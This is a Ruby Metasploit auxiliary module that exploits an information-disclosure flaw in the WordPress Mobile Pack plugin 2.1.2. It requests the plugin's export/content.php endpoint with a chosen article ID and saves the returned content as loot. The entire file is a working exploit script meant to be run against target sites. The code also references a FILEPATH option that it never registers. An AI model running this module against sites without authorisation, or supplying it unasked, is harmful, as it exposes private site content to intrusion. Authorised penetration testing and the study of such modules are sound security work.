##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Mobile Pack Information Disclosure Vulnerability',
      'Description'    => %q{
        This module exploits a information disclosure vulnerability in WordPress Plugin
        "WP Mobile Pack" version 2.1.2, allowing to read files with privileges
        informations.
      },
      'References'     =>
        [
          ['WPVDB', '8107']
        ],
      'Author'         =>
        [
          'Nitin Venkatesh', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('POSTID', [true, 'Set the post identification to read', '1'])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('wordpress-mobile-pack', '2.1.3')
  end

  def run_host(ip)

    postid = datastore['POSTID']

    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),
      'vars_get'  =>
        {
          'content'   => 'exportarticle',
          'callback'  => 'exportarticle',
          'articleId' => "#{postid}"
        }
    )

    if res && res.code == 200 && res.body.length > 0

      vprint_status('Downloading information...')
      vprint_line("\n#{res.body}\n")

      fname = datastore['FILEPATH']

      path = store_loot(
        'mobilepack.disclosure',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to verify the POSTID parameter.")
    end
  end
end
